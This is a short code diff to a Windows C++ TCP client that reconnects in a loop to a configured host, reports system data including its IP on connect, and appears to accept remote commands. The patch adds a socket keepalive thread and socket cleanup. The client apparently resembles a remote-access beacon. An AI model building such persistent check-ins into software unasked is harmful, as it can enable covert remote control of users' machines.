@@ -54,6 +54,7 @@ AHXRCLIENT					client;
 
 void						onClientConnect();
 void						onClientRecData( char * data);
+DWORD WINAPI				t_ping(LPVOID lpParams);
 string						real_ip();
 
 #pragma comment				(lib, "shell32.lib")
@@ -105,9 +106,29 @@ void main(cli::array<System::String^>^ args)
 		if( client.init(str_host, str_port, TCP_SERVER, onClientConnect) ) 
 			client.listen(onClientRecData, false);
 
+		if (client.Socket_Client != INVALID_SOCKET)
+			closesocket(client.Socket_Client);
+
 		b_cmd = false; // Safe reset
 		Sleep(1000);
 	}
+}
+
+DWORD WINAPI t_ping(LPVOID lpParams) {
+	while (1) {
+		Sleep(3000);
+		char buf;
+		int err = recv(client.Socket_Client, &buf, 1, MSG_PEEK);
+		if (err == SOCKET_ERROR)
+		{
+			if (WSAGetLastError() != WSAEWOULDBLOCK)
+			{
+				client.close();
+				break;
+			}
+		}
+	}
+	return 0;
 }
 
 void onClientConnect() {
@@ -124,6 +145,8 @@ void onClientConnect() {
 	sys_data["PORT"] = str_port;
 
 	client.send_data(sys_data.dump().c_str());
+
+	CreateThread(0, 0, t_ping, 0, 0, 0);
 }
 
 void onClientRecData( char * data ) {
